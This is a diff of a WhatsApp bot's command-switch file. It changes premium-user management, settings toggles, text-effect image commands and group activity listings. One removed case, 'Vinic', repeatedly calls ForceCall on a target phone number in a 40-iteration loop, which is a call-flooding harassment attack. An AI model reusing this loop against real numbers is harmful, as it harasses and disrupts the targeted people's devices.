-
-        // Check if user is premium
-        const userIndex = prem.indexOf(fullNumber);
-        if (userIndex === -1) {
-            await conn.sendMessage(m.chat, {
-                react: {
-                    text: "❌",
-                    key: m.key
-                }
-            });
-            return reply(`❌ *This number is not in the premium list!*\nNumber: ${phoneNumber}`);
-        }
-
-        // Remove from premium list
-        prem.splice(userIndex, 1);
-        
-        // Remove duplicates and save
-        prem = [...new Set(prem)];
-        fs.writeFileSync(premPath, JSON.stringify(prem, null, 2));
-
-        // Update global premium list immediately
-        if (global.premiumUsers) {
-            global.premiumUsers.delete(fullNumber);
-        }
-
-        // Success reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "✅",
-                key: m.key
-            }
-        });
-
-        reply(`✅ *Premium access removed successfully!*\n\n• Number: ${phoneNumber}\n• Remaining Premium Users: ${prem.length}\n\nUser can no longer access premium commands.`);
-
-        // Optional: Send notification to the removed user
-        try {
-            const userExists = await conn.onWhatsApp(fullNumber);
-            if (userExists.length > 0) {
-                await conn.sendMessage(fullNumber, {
-                    text: `⚠️ *PREMIUM ACCESS REMOVED*\n\nYour premium access to *${global.botname}* has been removed.\n\nYou no longer have access to:\n• Premium commands\n• Priority support\n• Exclusive features\n\nContact the owner if this was a mistake.`
-                });
-            }
-        } catch (notifyError) {
-            console.log('Could not send removal notification to user:', notifyError);
-        }
-
+        await sendMenu(conn, m, prefix, global);
+        // Loading message will remain visible along with the menu
     } catch (error) {
-        console.error('Error in delprem command:', error);
-        
-        // Error reaction
+        console.error('Error in menu command:', error);
         await conn.sendMessage(m.chat, {
-            react: {
-                text: "❌",
-                key: m.key
-            }
+            text: '❌ Error displaying menu. Please try again!'
         });
-        
-        reply('❌ *Failed to remove premium user.* Please try again or check the number format.');
     }
     break;
-}
-
-// Add companion command to remove multiple users at once
-case "delpremmulti":
-case "removepremmulti":
-case "bulkdelprem": {
-    if (!Access) return reply(mess.owner);
-    if (!text) return reply(`*Usage:* ${prefix}delpremmulti [number1] [number2] [number3]\n*Example:* ${prefix}delpremmulti 256742932677 256712345678`);
-
-    try {
-        // Send loading reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "⏳",
-                key: m.key
-            }
-        });
-
-        // Extract numbers from text
-        const numbers = text.split(/\s+/).map(num => num.replace(/[^0-9]/g, ''));
-        const validNumbers = numbers.filter(num => num.length >= 9);
-        
-        if (validNumbers.length === 0) {
-            await conn.sendMessage(m.chat, {
-                react: {
-                    text: "❌",
-                    key: m.key
-                }
-            });
-            return reply('❌ *No valid numbers provided!*');
-        }
-
-        // Load premium list
-        const premPath = './start/lib/database/premium.json';
-        let prem = [];
-        
-        if (fs.existsSync(premPath)) {
-            try {
-                prem = JSON.parse(fs.readFileSync(premPath, 'utf-8'));
-            } catch (e) {
-                console.error('Error parsing premium.json:', e);
-                prem = [];
-            }
-        }
-
-        let removedCount = 0;
-        let notFoundCount = 0;
-        const removedNumbers = [];
-
-        // Process each number
-        for (const rawNumber of validNumbers) {
-            let phoneNumber = rawNumber;
-            
-            // Format number
-            if (phoneNumber.startsWith('0')) {
-                phoneNumber = '256' + phoneNumber.substring(1);
-            } else if (phoneNumber.length === 9 && !phoneNumber.startsWith('256')) {
-                phoneNumber = '256' + phoneNumber;
-            }
-            
-            const fullNumber = phoneNumber + '@s.whatsapp.net';
-            const userIndex = prem.indexOf(fullNumber);
-            
-            if (userIndex !== -1) {
-                prem.splice(userIndex, 1);
-                removedCount++;
-                removedNumbers.push(phoneNumber);
-                
-                // Update global list
-                if (global.premiumUsers) {
-                    global.premiumUsers.delete(fullNumber);
-                }
-            } else {
-                notFoundCount++;
-            }
-        }
-
-        // Save updated list
-        if (removedCount > 0) {
-            prem = [...new Set(prem)];
-            fs.writeFileSync(premPath, JSON.stringify(prem, null, 2));
-        }
-
-        // Success reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "✅",
-                key: m.key
-            }
-        });
-
-        let resultMessage = `✅ *BULK PREMIUM REMOVAL COMPLETE*\n\n`;
-        resultMessage += `• Removed: ${removedCount} users\n`;
-        resultMessage += `• Not Found: ${notFoundCount} users\n`;
-        resultMessage += `• Remaining Premium: ${prem.length} users\n`;
-        
-        if (removedNumbers.length > 0) {
-            resultMessage += `\n*Removed Numbers:*\n`;
-            resultMessage += removedNumbers.slice(0, 5).map(num => `• ${num}`).join('\n');
-            if (removedNumbers.length > 5) {
-                resultMessage += `\n• ...and ${removedNumbers.length - 5} more`;
-            }
-        }
-
-        reply(resultMessage);
-
-    } catch (error) {
-        console.error('Error in bulk delprem command:', error);
-        
-        // Error reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "❌",
-                key: m.key
-            }
-        });
-        
-        reply('❌ *Failed to remove premium users.* Please try again.');
-    }
-    break;
-}
-
-// Add command to clear all premium users
-case "clearallprem":
-case "resetpremium": {
-    if (!Access) return reply(mess.owner);
-
-    try {
-        // Send loading reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "⏳",
-                key: m.key
-            }
-        });
-
-        // Load current premium count
-        const premPath = './start/lib/database/premium.json';
-        let prem = [];
-        let previousCount = 0;
-        
-        if (fs.existsSync(premPath)) {
-            try {
-                prem = JSON.parse(fs.readFileSync(premPath, 'utf-8'));
-                previousCount = prem.length;
-            } catch (e) {
-                console.error('Error parsing premium.json:', e);
-            }
-        }
-
-        // Confirmation for safety
-        if (args[0] !== 'confirm') {
-            return reply(`⚠️ *DANGEROUS COMMAND* ⚠️\n\nThis will remove ALL ${previousCount} premium users!\n\nIf you're sure, type: *${prefix}clearallprem confirm*`);
-        }
-
-        // Clear all premium users
-        prem = [];
-        fs.writeFileSync(premPath, JSON.stringify([], null, 2));
-
-        // Clear global list
-        if (global.premiumUsers) {
-            global.premiumUsers.clear();
-        }
-
-        // Success reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "✅",
-                key: m.key
-            }
-        });
-
-        reply(`✅ *ALL PREMIUM USERS CLEARED!*\n\nRemoved ${previousCount} premium users.\nPremium list is now empty.`);
-
-    } catch (error) {
-        console.error('Error clearing all premium users:', error);
-        
-        // Error reaction
-        await conn.sendMessage(m.chat, {
-            react: {
-                text: "❌",
-                key: m.key
-            }
-        });
-        
-        reply('❌ *Failed to clear premium users.* Please try again.');
-    }
-   
-}
-break
-case "Vinic":{
-if(!Access) return reply(mess.owner)
-if(!text) return reply("*Example: .Vinic 2567...*")
-target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
-await bugLoad()
-reply(`▬▭▬▭▬▭▬▭▬▭▬▭▬\n${buggy}\n▬▭▬▭▬▭▬▭▬▭▬▭▬`)
-     
-for(let i = 0; i < 40; i++){
-await ForceCall(target)
-await ForceCall(target)
-await ForceCall(target)
-await sleep(1500)
-await ForceCall(target)
-await ForceCall(target)
-await sleep(1500)
-await ForceCall(target)
-
-}
 }
 //======[OWNER CMDS]======//
 case "addowner": 
@@ -3039,12 +1983,16 @@ await saveDatabase();
 reply(`Anti-delete ${type} mode ${option === "on" ? "enabled" : "disabled"} successfully`);
 }
 break
-// Add to your switch statement for the aichat command
 case 'aichat':
-case 'chatbot':
-case 'bot': {
+case "chatbot": {
     if (!Access) return reply(mess.owner);
     
+    // Initialize settings
+    if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
+    if (!global.db.data.settings[botNumber].config) global.db.data.settings[botNumber].config = {};
+    
+    const current = global.db.data.settings[botNumber].config.AI_CHAT || false;
+      
     const status = args[0]?.toLowerCase();
     if (status === "on") {
         setAIChatbotState(true);
@@ -3058,8 +2006,9 @@ case 'bot': {
     } else {
         return reply(`Current AI state: ${getAIChatbotState() === "true" ? "ON" : "OFF"}\nUsage: ${prefix}aichat on/off/clear`);
     }
-    break;
+    await saveDatabase(); // THIS IS CRITICAL
 }
+break
 case "autoreact": {
     if (!Access) return reply(mess.owner);
        
@@ -3153,19 +2102,6 @@ case "leave": {
     await sleep(3000);
     await conn.groupLeave(m.chat);
 }
-break
-case 'statusview':{
-             if (!Access) return reply(mess.owner)
-               if (args.length < 1) return reply('on/off?')
-               if (args[0] === 'on') {
-                  autostatus = true
-                  reply(`${command} is enabled`)
-               } else if (args[0] === 'off') {
-                  autostatus = true
-                  reply(`${command} is disabled`)
-               }
-            }
-            
 break
 case "getpp": {
     if (!Access) return reply(mess.owner);
@@ -3621,48 +2557,37 @@ case "autoreactstatus": {
     reply(`Auto react status ${option === "on" ? "enabled" : "disabled"} successfully`);
 }
 break
-case "antiedit": {        
-   try {
- if (!Access) return reply (mess.owner)
-     
+case "antiedit": {
+    if (!Access) return reply(mess.owner);
+    if (args.length < 2) return reply(`Example: ${prefix + command} private on/off\nOr: ${prefix + command} chat on/off`);
 
-        if (!args[0]) {
-            const currentStatus = global.db.data.settings[botNumber]?.config?.antiedit ? 'ON' : 'OFF';
-            const currentMode = global.db.data.settings[botNumber]?.config?.antieditmode || 'chat';
-            
-            return m.reply(`📝 *Anti-Edit Settings*\n\nStatus: ${currentStatus}\nMode: ${currentMode}\n\nUsage:\n• ${prefix}antiedit on - Enable anti-edit\n• ${prefix}antiedit off - Disable anti-edit\n• ${prefix}antiedit chat - Send notifications in same chat\n• ${prefix}antiedit private - Send notifications to owner's inbox`);
-        }
+    const validTypes = ["private", "chat"];
+    const validOptions = ["on", "off"];
 
-        const action = args[0].toLowerCase();
-        
-        if (action === 'on') {
-            global.db.data.settings[botNumber].config.antiedit = true;
-            await saveDatabase();
-            return m.reply(`✅ Anti-edit has been enabled!`);
-            
-        } else if (action === 'off') {
-            global.db.data.settings[botNumber].config.antiedit = false;
-            await saveDatabase();
-            return m.reply(`✅ Anti-edit has been disabled!`);
-            
-        } else if (action === 'chat') {
-            global.db.data.settings[botNumber].config.antieditmode = 'chat';
-            await saveDatabase();
-            return m.reply(`✅ Anti-edit mode set to: CHAT\n\nEdited messages will be shown in the same chat where editing occurred.`);
-            
-        } else if (action === 'private') {
-            global.db.data.settings[botNumber].config.antieditmode = 'private';
-            await saveDatabase();
-            return m.reply(`✅ Anti-edit mode set to: PRIVATE\n\nEdited messages will be sent to owner's inbox.`);
-            
-        } else {
-            return m.reply(`❌ Invalid option! Use: on, off, chat, or private`);
-        }
+    const type = args[0].toLowerCase();
+    const option = args[1].toLowerCase();
 
-    } catch (error) {
-        console.error('Error in antiedit command:', error);
-        m.reply(`❌ Error: ${error.message}`);
+    if (!validTypes.includes(type)) return reply("Invalid type. Use 'private' or 'chat'");
+    if (!validOptions.includes(option)) return reply("Invalid option. Use 'on' or 'off'");
+
+    // Fix: Properly get setting from global database
+    if (!global.db.data.settings) global.db.data.settings = {};
+    if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
+    let setting = global.db.data.settings[botNumber];
+
+    // Initialize config if it doesn't exist
+    if (!setting.config) setting.config = {};
+
+    // Set the anti-edit configuration based on type
+    if (type === "private") {
+        setting.config.antiedit = option === "on" ? "private" : false;
+    } else if (type === "chat") {
+        setting.config.antiedit = option === "on" ? "chat" : false;
     }
+
+    await saveDatabase();
+
+    reply(`Anti-edit ${type} mode ${option === "on" ? "enabled" : "disabled"} successfully`);
 }
 break
 case "welcome": { 
@@ -4679,7 +3604,7 @@ case 'getbisnis': case 'getbusiness': {
     }
   } catch (err) {
     console.error(err);
-    m.reply('error.');
+    m.reply(`${global.wm}`);
   }
 }
 break
@@ -4788,8 +3713,11 @@ case "time": {
 *Example:* ${prefix}time Japan
             `.trim();
 
-            return await conn.sendMessage(m.chat, { text: timeInfo }, { quoted: m });
-        }
+            return await conn.sendMessage(m.chat, { 
+    text: `${global.wm}\n\n${timeInfo}`
+}, { quoted: m });
+  
+  }
 
         // Get timezone for the country
         const timezones = moment.tz.zonesForCountry(countryName);
@@ -4822,27 +3750,6 @@ case "time": {
         reply('❌ *Unable to fetch time information.*\nPlease try a different country name or try again later.');
     }
     
-}
-break
-case "dragonball": {
-let q = args.join(" ");
-    if (!q) {
-      return reply(`*Example: ${prefix}dragonball Kelvin*`);
-    }
-
-    const link = "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";
-
-    try {
-      let result = await ephoto(link, q);
-      await conn.sendMessage(
-        m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
-        { quoted: m }
-      );
-    } catch (error) {
-      console.error("Error in dragonball command:", error);
-      reply("*An error occurred while generating the effect.*");
-    }
 }
 break
 case "glossysilver": {
@@ -4878,7 +3785,7 @@ case 'arting': {
     await conn.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
     
     try {
-        await conn.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }}, { quoted: m });
+        await conn.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }, caption: `${global.wm}`}, { quoted: m });
     } catch (err) {
         console.log(err.message);
         conn.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
@@ -4898,7 +3805,7 @@ let q = args.join(" ");
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -4919,7 +3826,7 @@ case "blackpinklogo": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -4940,7 +3847,7 @@ case "blackpinkstyle": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -4961,7 +3868,7 @@ case "cartoonstyle": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -4982,7 +3889,7 @@ case "deadpool": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5003,7 +3910,7 @@ let q = args.join(" ");
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5024,7 +3931,7 @@ let q = args.join(" ");
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5045,7 +3952,7 @@ case "freecreate": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5066,7 +3973,7 @@ case "galaxystyle": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5087,7 +3994,7 @@ case "galaxywallpaper": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5108,7 +4015,7 @@ case "makingneon": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5128,7 +4035,7 @@ case "matrix": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5149,7 +4056,7 @@ let q = args.join(" ");
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5170,7 +4077,7 @@ case "sand": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5191,7 +4098,7 @@ case "summerbeach": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5212,7 +4119,7 @@ case "topography": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5233,7 +4140,7 @@ case "typography": {
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -5254,11 +4161,32 @@ let q = args.join(" ");
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
       console.error("Error in luxurygold command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "1917style": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}1917style Kelvin*`);
+    }
+
+    const link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in 1917style command:", error);
       reply("*An error occurred while generating the effect.*");
     }
 }
@@ -5275,11 +4203,32 @@ let q = args.join(" ");
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
       console.error("Error in multicoloredneon command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "dragonball": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}dragonball Kelvin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in dragonball command:", error);
       reply("*An error occurred while generating the effect.*");
     }
 }
@@ -5296,7 +4245,7 @@ let q = args.join(" ");
       let result = await ephoto(link, q);
       await conn.sendMessage(
         m.chat,
-        { image: { url: result }, caption: `${mess.done}` },
+        { image: { url: result }, caption: `${global.wm}` },
         { quoted: m }
       );
     } catch (error) {
@@ -7090,139 +6039,7 @@ break
 case 'bully': {
 await fetchReactionImage ({ conn, m, reply, command: 'bully'})
 }
-//=====[Sport menu]======
-case 'epl': // English Premier League
-case '.pl': {
-  if (!text) return reply(`Please specify what you want:\n.epl standings\n.epl matches\n.epl scorers\n.epl upcoming`);
-  
-  const query = args[0]?.toLowerCase();
-  if (query === 'standings' || query === 'table') {
-    await formatStandings('PL', 'Premier League', { m, reply: (msg) => conn.reply(msg) });
-  } else if (query === 'matches' || query === 'results') {
-    await formatMatches('PL', 'Premier League', { m, reply: (msg) => connreply(msg) });
-  } else if (query === 'scorers' || query === 'topscorers') {
-    await formatTopScorers('PL', 'Premier League', { m, reply: (msg) => conn.reply(msg) });
-  } else if (query === 'upcoming' || query === 'fixtures') {
-    await formatUpcomingMatches('PL', 'Premier League', { m, reply: (msg) => conn.reply(msg) });
-  } else {
-    m.reply(`Invalid option. Use:\n.epl standings\n.epl matches\n.epl scorers\n.epl upcoming`);
-  }
-  break;
-}
 
-case 'laliga': // La Liga
-case '.ll': {
-  if (!text) return reply(`Please specify what you want:\n.laliga standings\n.laliga matches\n.laliga scorers\n.laliga upcoming`);
-  
-  const query = args[0]?.toLowerCase();
-  if (query === 'standings' || query === 'table') {
-    await formatStandings('LL', 'La Liga', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'matches' || query === 'results') {
-    await formatMatches('LL', 'La Liga', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'scorers' || query === 'topscorers') {
-    await formatTopScorers('LL', 'La Liga', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'upcoming' || query === 'fixtures') {
-    await formatUpcomingMatches('LL', 'La Liga', { m, reply: (msg) => m.reply(msg) });
-  } else {
-    reply(`Invalid option. Use:\n.laliga standings\n.laliga matches\n.laliga scorers\n.laliga upcoming`);
-  }
-  break;
-}
-
-case 'bundesliga': // Bundesliga
-case '.bl': {
-  if (!text) return reply(`Please specify what you want:\n.bundesliga standings\n.bundesliga matches\n.bundesliga scorers\n.bundesliga upcoming`);
-  
-  const query = args[0]?.toLowerCase();
-  if (query === 'standings' || query === 'table') {
-    await formatStandings('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'matches' || query === 'results') {
-    await formatMatches('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'scorers' || query === 'topscorers') {
-    await formatTopScorers('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'upcoming' || query === 'fixtures') {
-    await formatUpcomingMatches('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
-  } else {
-    reply(`Invalid option. Use:\n.bundesliga standings\n.bundesliga matches\n.bundesliga scorers\n.bundesliga upcoming`);
-  }
-  break;
-}
-
-case 'seriea': // Serie A
-case '.sa': {
-  if (!text) return reply(`Please specify what you want:\n.seriea standings\n.seriea matches\n.seriea scorers\n.seriea upcoming`);
-  
-  const query = args[0]?.toLowerCase();
-  if (query === 'standings' || query === 'table') {
-    await formatStandings('SA', 'Serie A', { m, reply: (msg) => m.reply(msg) });
-  } else if (query === 'matches' || query === 'results') {
-    await formatMatches('SA', 'Serie A', { m, reply: (msg) => m.reply(msg) });
-  } else if (query === 'scorers' || query === 'topscorers') {
-    await formatTopScorers('SA', 'Serie A', { m, reply: (msg) => m.reply(msg) });
-  } else if (query === 'upcoming' || query === 'fixtures') {
-    await formatUpcomingMatches('SA', 'Serie A', { m, reply: (msg) => reply(msg) });
-  } else {
-    reply(`Invalid option. Use:\n.seriea standings\n.seriea matches\n.seriea scorers\n.seriea upcoming`);
-  }
-  break;
-}
-
-case 'ligue1': // Ligue 1
-case '.l1': {
-  if (!text) return reply(`Please specify what you want:\n.ligue1 standings\n.ligue1 matches\n.ligue1 scorers\n.ligue1 upcoming`);
-  
-  const query = args[0]?.toLowerCase();
-  if (query === 'standings' || query === 'table') {
-    await formatStandings('L1', 'Ligue 1', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'matches' || query === 'results') {
-    await formatMatches('L1', 'Ligue 1', { m, reply: (msg) => m.reply(msg) });
-  } else if (query === 'scorers' || query === 'topscorers') {
-    await formatTopScorers('L1', 'Ligue 1', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'upcoming' || query === 'fixtures') {
-    await formatUpcomingMatches('L1', 'Ligue 1', { m, reply: (msg) => reply(msg) });
-  } else {
-    reply(`Invalid option. Use:\n.ligue1 standings\n.ligue1 matches\n.ligue1 scorers\n.ligue1 upcoming`);
-  }
-  break;
-}
-
-case 'ucl': // UEFA Champions League
-case '.champions': {
-  if (!text) return reply(`Please specify what you want:\n.ucl standings\n.ucl matches\n.ucl scorers\n.ucl upcoming`);
-  
-  const query = args[0]?.toLowerCase();
-  if (query === 'standings' || query === 'table') {
-    await formatStandings('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'matches' || query === 'results') {
-    await formatMatches('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'scorers' || query === 'topscorers') {
-    await formatTopScorers('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'upcoming' || query === 'fixtures') {
-    await formatUpcomingMatches('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
-  } else {
-    m.reply(`Invalid option. Use:\n.ucl standings\n.ucl matches\n.ucl scorers\n.ucl upcoming`);
-  }
-  break;
-}
-
-case 'uel': // UEFA Europa League
-case '.europa': {
-  if (!text) return reply(`Please specify what you want:\n.uel standings\n.uel matches\n.uel scorers\n.uel upcoming`);
-  
-  const query = args[0]?.toLowerCase();
-  if (query === 'standings' || query === 'table') {
-    await formatStandings('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'matches' || query === 'results') {
-    await formatMatches('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'scorers' || query === 'topscorers') {
-    await formatTopScorers('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
-  } else if (query === 'upcoming' || query === 'fixtures') {
-    await formatUpcomingMatches('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
-  } else {
-    reply(`Invalid option. Use:\n.uel standings\n.uel matches\n.uel scorers\n.uel upcoming`);
-  }
-  break;
-}
 //======[Ai menu]=====[
 case "generate": {
 if (!text) return reply(global.mess.notext);
@@ -9512,13 +8329,30 @@ break
 case "listactive": {
 if (!m.isGroup) return reply(mess.group);
 
-const activeUsers = await getActiveUsers(from);
-if (!activeUsers.length) return reply('*No active users found in this group.*');
+    const activeUsers = await GroupDB.getActiveUsers(from);
+    if (!activeUsers.length) return reply('*No active users found in this group.*');
 
-let message = `📊 *Active Users in Group*\n\n`;
-message += activeUsers.map((user, i) => `🔹 ${i + 1}. @${user.jid.split('@')[0]} - *${user.count} messages*`).join('\n');
+    let message = `📊 *Active Users in Group*\n\n`;
+    message += activeUsers.map((user, i) => `⚡ ${i + 1}. @${user.jid.split('@')[0]} - *${user.count} messages*`).join('\n');
 
-await conn.sendMessage(m.chat, { text: message, mentions: activeUsers.map(u => u.jid) }, { quoted: m });
+    await conn.sendMessage(m.chat, { text: message, mentions: activeUsers.map(u => u.jid) }, { quoted: m });
+}
+break
+case "listinactive": {
+if (!m.isGroup) return reply(mess.group);
+
+    const metadata = await conn.groupMetadata(from);
+    const allParticipants = metadata.participants.map(p => p.id);
+    const activeUsers = await GroupDB.getActiveUsers(from);
+    const activeJids = activeUsers.map(user => user.jid);
+
+    const inactiveUsers = allParticipants.filter(jid => !activeJids.includes(jid));
+    if (!inactiveUsers.length) return reply('*No inactive users found in this group.*');
+
+    let message = `⚠️ *Inactive Users in Group*\n\n`;
+    message += inactiveUsers.map((user, i) => `⚡ ${i + 1}. @${user.split('@')[0]}`).join('\n');
+
+    await conn.sendMessage(m.chat, { text: message, mentions: inactiveUsers }, { quoted: m });
 }
 break
 // Add companion command for top chatters
@@ -9612,104 +8446,6 @@ case "leaderboard": {
     
 }
 break
-case "listinactive": {
-    if (!m.isGroup) return reply(mess.group);
-    
-    try {
-        // Get group metadata safely
-        const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => null) : null;
-        if (!groupMetadata) return reply('*Could not retrieve group information.*');
-
-        const participants = groupMetadata.participants || [];
-        if (participants.length === 0) return reply('*No members found in this group.*');
-
-        // Get message store for this group
-        const groupMessages = store.messages && store.messages[m.chat] ? store.messages[m.chat] : [];
-        
-        // Calculate inactivity period (default: 7 days)
-        const inactivityDays = parseInt(args[0]) || 7;
-        const inactivityThreshold = Date.now() - (inactivityDays * 24 * 60 * 60 * 1000);
-        
-        // Track last activity for each user
-        const userLastActivity = {};
-        
-        // Analyze recent messages (last 1000 messages max for performance)
-        const recentMessages = Array.isArray(groupMessages) ? groupMessages.slice(-1000) : [];
-        
-        recentMessages.forEach(msg => {
-            if (msg?.key && !msg.key.fromMe) {
-                const userId = msg.key.participant || msg.key.remoteJid;
-                const messageTime = msg.messageTimestamp ? msg.messageTimestamp * 1000 : Date.now();
-                
-                if (userId && messageTime) {
-                    // Update last activity if this message is newer
-                    if (!userLastActivity[userId] || messageTime > userLastActivity[userId]) {
-                        userLastActivity[userId] = messageTime;
-                    }
-                }
-            }
-        });
-
-        // Identify inactive users
-        const inactiveUsers = [];
-        
-        participants.forEach(participant => {
-            const userId = participant.id;
-            const lastActive = userLastActivity[userId] || 0;
-            const daysInactive = Math.floor((Date.now() - lastActive) / (24 * 60 * 60 * 1000));
-            
-            // Consider user inactive if no activity found or beyond threshold
-            if (lastActive === 0 || lastActive < inactivityThreshold) {
-                inactiveUsers.push({
-                    jid: userId,
-                    lastActive: lastActive,
-                    daysInactive: daysInactive,
-                    isAdmin: participant.admin || false
-                });
-            }
-        });
-
-        // Sort by most inactive first
-        inactiveUsers.sort((a, b) => a.lastActive - b.lastActive);
-
-        if (inactiveUsers.length === 0) {
-            return reply(`*No inactive members found in this group (based on ${inactivityDays} day threshold).*`);
-        }
-
-        // Format inactive users list
-        let inactiveList = `📋 *INACTIVE MEMBERS LIST* 📋\n\n`;
-        inactiveList += `*Inactivity Threshold:* ${inactivityDays} day(s)\n`;
-        inactiveList += `*Total Inactive Members:* ${inactiveUsers.length}\n\n`;
-        
-        inactiveList += inactiveUsers.map((user, index) => {
-            const username = user.jid.split('@')[0];
-            const lastActiveDate = user.lastActive ? new Date(user.lastActive).toLocaleDateString() : 'Never active';
-            const role = user.isAdmin ? '👑 Admin' : '👤 Member';
-            
